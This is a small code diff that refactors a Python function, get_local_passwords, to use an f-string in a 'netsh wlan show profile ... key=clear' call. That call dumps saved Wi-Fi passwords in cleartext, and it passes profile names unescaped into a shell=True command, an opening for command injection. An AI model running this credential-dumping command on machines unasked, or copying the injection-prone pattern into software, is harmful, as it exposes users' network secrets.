@@ -44,9 +44,7 @@ def get_local_passwords() -> None:
                 for profile_name in profile_names:
                     try:
                         wifi_info = subprocess.check_output(
-                            'netsh wlan show profile name="{}" key=clear'.format(
-                                profile_name
-                            ),
+                            f'netsh wlan show profile name="{profile_name}" key=clear',
                             shell=True,
                         ).decode("utf-8")
 
